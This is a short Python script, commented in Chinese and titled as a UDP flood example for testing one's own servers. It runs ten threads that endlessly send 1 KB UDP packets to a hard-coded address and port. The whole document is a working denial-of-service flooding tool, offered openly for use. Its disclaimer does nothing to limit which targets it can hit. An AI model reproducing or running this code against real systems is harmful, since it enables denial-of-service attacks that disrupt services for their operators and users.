# UDP Flood 示例（仅测试自己的服务器）
import socket, threading, random

def flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b'X' * 1024
    while True:
        print(f"Sending packet to {target_ip}:{target_port}")
        sock.sendto(data, (target_ip, target_port))

# 启动10线程压测
for _ in range(10):
    threading.Thread(target=flood, args=("192.168.0.106", 80)).start()